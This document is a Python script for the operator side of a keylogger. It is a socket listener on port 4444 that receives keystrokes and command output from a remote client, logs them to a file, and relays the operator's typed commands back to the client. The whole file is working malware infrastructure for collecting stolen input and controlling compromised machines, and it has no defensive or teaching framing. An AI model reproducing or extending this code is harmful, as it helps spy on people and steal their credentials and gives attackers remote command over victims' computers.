import socket
import datetime
import os
import select
import sys

# Configuration
HOST = "0.0.0.0"
PORT = 4444
LOG_FILE = os.path.expanduser("keylogger_received_logs.txt")

def log_message(message, is_command=False):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # Log only keystrokes, command outputs, and connection messages
    if not message.startswith("[*] Logs:") and not message.startswith("LOG:"):
        with open(LOG_FILE, "a", buffering=1) as f:
            f.write(f"[{timestamp}] {message}\n")

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)
    log_message(f"Listening on {HOST}:{PORT}")
    print(f"Listening on {HOST}:{PORT}...")

    try:
        while True:
            client, addr = server.accept()
            log_message(f"Connection from {addr}")
            print(f"Connection from {addr}")

            try:
                buffer = ""
                while True:
                    readable, _, _ = select.select([client, sys.stdin], [], [], 0.1)
                    for s in readable:
                        if s is client:
                            data = client.recv(1024).decode(errors='ignore')
                            if not data:
                                raise ConnectionError("Client disconnected")
                            buffer += data
                            lines = buffer.split('\n')
                            buffer = lines[-1]  # Keep incomplete line
                            for message in lines[:-1]:
                                message = message.strip()
                                if message:
                                    print(message)  # Display all messages
                                    log_message(message)  # Log only keystrokes/outputs
                        elif s is sys.stdin:
                            command = sys.stdin.readline().strip()
                            client.send(command.encode())
                            log_message(f"Sent command: {command}", is_command=True)
                            print(f"Sent command: {command}")
                            if command.lower() == "exit":
                                raise ConnectionError("Exit command sent")
            except Exception as e:
                log_message(f"Error: {e}")
                print(f"Error: {e}")
            finally:
                client.close()
                log_message(f"Connection closed from {addr}")
                print(f"Connection closed from {addr}")
    except KeyboardInterrupt:
        print("\nShutting down listener...")
    finally:
        server.close()

if __name__ == "__main__":
    main()
